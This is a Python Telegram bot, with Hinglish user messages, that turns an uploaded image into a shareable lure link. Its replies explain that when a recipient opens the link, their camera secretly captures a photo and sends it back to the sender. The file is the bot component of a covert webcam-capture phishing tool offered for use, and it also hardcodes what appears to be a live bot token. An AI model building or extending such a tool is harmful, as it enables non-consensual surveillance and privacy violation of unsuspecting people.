import os
import uuid
import asyncio
import json
from telegram import Update
from telegram.error import TimedOut, NetworkError
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = os.environ.get("BOT_TOKEN", "9238640840:AAG-WFz-oHToWP6pRm-nuO5nQBpIUB5AInQ")
BASE_URL = os.environ.get("BASE_URL", "http://localhost:5000")

IMG_DIR = "captured_images"
MAP_FILE = "token_map.json"

os.makedirs(IMG_DIR, exist_ok=True)


def load_map():
    if os.path.exists(MAP_FILE):
        try:
            return json.load(open(MAP_FILE))
        except Exception:
            return {}
    return {}


def save_map(m):
    json.dump(m, open(MAP_FILE, "w"))


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Bhai, mujhe ek image bhej. Main tujhe ek link dunga jo tu kisi ko bhej sakta hai."
    )


async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    photo = update.message.photo[-1]
    file_id = photo.file_id

    token = uuid.uuid4().hex[:12]
    img_path = os.path.join(IMG_DIR, f"{token}.jpg")

    # retry: 3 attempts, har attempt ke beech 2 second wait
    last_err = None
    for attempt in range(3):
        try:
            file = await context.bot.get_file(file_id)
            await file.download_to_drive(img_path)
            last_err = None
            break
        except (TimedOut, NetworkError) as e:
            last_err = e
            print(f"get_file attempt {attempt + 1} failed: {e}")
            if attempt < 2:
                await asyncio.sleep(2)

    if last_err is not None:
        await update.message.reply_text(
            "❌ Image download nahi ho payi (network timeout). Dobara bhej please."
        )
        return

    m = load_map()
    m[token] = chat_id
    save_map(m)

    link = f"{BASE_URL}/?t={token}"
    await update.message.reply_text(
        f"✅ Link ready:\n\n{link}\n\n"
        f"Ise kisi ko bhej. Jab woh kholenge, teri image dikhegi aur camera se photo capture hoke yahan aayegi."
    )


async def main_bot():
    tg_app = (
        Application.builder()
        .token(BOT_TOKEN)
        .read_timeout(30)
        .connect_timeout(30)
        .write_timeout(30)
        .pool_timeout(30)
        .build()
    )
    tg_app.add_handler(CommandHandler("start", start))
    tg_app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    print("Bot starting (polling)...")
    await tg_app.initialize()
    await tg_app.start()
    await tg_app.updater.start_polling()
    while True:
        await asyncio.sleep(3600)


def run_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(main_bot())


if __name__ == "__main__":
    run_bot()
